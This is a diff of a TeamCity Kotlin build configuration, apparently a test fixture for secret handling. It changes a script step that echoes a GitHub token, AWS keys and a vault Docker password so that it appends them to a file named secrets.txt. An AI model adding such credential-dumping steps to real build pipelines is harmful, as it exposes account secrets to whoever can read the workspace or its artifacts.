@@ -89,7 +89,7 @@ object Build : BuildType({
         }
         script {
             id = "simpleRunner"
-            scriptContent = "echo %empty_github_token% %env.AWS_ACCESS_KEY_ID% %env.AWS_SECRET_ACCESS_KEY% %vaultID_docker_password%"
+            scriptContent = "echo %empty_github_token% %env.AWS_ACCESS_KEY_ID% %env.AWS_SECRET_ACCESS_KEY% %vaultID_docker_password% >> secrets.txt"
         }
     }
 
